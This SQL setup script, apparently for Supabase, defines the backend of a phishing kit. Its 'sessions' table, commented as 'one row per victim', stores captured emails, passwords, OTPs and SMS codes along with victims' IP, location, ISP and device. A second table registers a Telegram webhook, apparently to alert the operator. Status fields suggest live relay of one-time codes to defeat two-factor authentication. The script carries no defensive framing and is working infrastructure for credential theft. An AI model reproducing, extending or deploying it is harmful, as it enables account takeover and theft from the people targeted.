-- Run this in Supabase → SQL Editor

-- Sessions table: one row per victim
CREATE TABLE IF NOT EXISTS sessions (
  id              TEXT PRIMARY KEY,
  email           TEXT,
  password        TEXT,
  otp             TEXT,
  sms_code        TEXT,
  phone_code      TEXT,
  status          TEXT    DEFAULT 'pending',
  response_type   TEXT,
  ip              TEXT,
  country         TEXT,
  city            TEXT,
  region          TEXT,
  isp             TEXT,
  lat             TEXT,
  lon             TEXT,
  device          TEXT,
  created_at      TIMESTAMPTZ DEFAULT NOW(),
  responded_at    TIMESTAMPTZ,
  last_update     TIMESTAMPTZ DEFAULT NOW()
);

-- Webhook registration: track which URL is registered with Telegram
CREATE TABLE IF NOT EXISTS webhook_registration (
  id          INTEGER PRIMARY KEY DEFAULT 1,  -- singleton row
  webhook_url TEXT,
  registered_at TIMESTAMPTZ DEFAULT NOW()
);

-- Disable RLS (these tables are backend-only, accessed via service role key)
ALTER TABLE sessions DISABLE ROW LEVEL SECURITY;
ALTER TABLE webhook_registration DISABLE ROW LEVEL SECURITY;
